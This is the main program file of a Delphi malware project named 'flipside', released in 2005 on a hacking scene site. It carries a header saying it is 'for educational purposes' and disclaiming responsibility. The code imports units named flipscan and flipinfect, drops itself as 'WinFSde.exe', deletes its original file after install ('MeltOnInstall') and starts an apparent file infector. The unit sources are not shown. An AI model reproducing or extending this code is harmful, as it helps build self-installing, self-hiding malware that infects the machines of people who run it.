   {

     Requested sourcecode for p0ke.no-ip.com page.
     use this as you want, but remember its only
     open source code for educational purposes.

     If you do not agree to take responsibility
     for any actions/damage made by this sourcecode
     (after your own modifications/compile) then
     close this project at once.
     The only responsible for anything here is you.

     (c) p0ke.no-ip.com 2005

     greets:
       HaTcHeT     - I liked your opensource binder source.                        (http://www.e-freak.co.uk)
                     This source is part based on it. Tho recoded.
       Elf         - I liked your mom. ;D                                          (none)
       Tzorcelan   - Peace out bro. Keep them sources commin'                      (none)
       Positron    - I like your sources, keep it up.                              (http://positronvx.cjb.net)

     Note:
       This sourcecode is uncommented for more advanced coders.
       A sourcecode with comments will be release at p0ke.no-ip.com

   }

   //  NOTE : - Use KOL to minimize the file-size.
   //         - Ive attached a "System" directory
   //         - Goto "Project" -> "Options" -> "Directories" -> "Search path"
   //         - And enter path to the attached "System" directory to minimize
   //         - the file-size.

   program flipside;

   uses
     flipfunc in 'flipfunc.pas',
     flipscan in 'flipscan.pas',
     flipinfect in 'flipinfect.pas';

   var
     Flipp: TFlipp;

   begin

     ReleaseFiles;
     Flipp := TFlipp.Create;
     Flipp.MeltOnInstall := True;
     Flipp.Install('WinFSde.exe', 1, True);
     Flipp.StartPE;
     Flipp.Free;

   end.

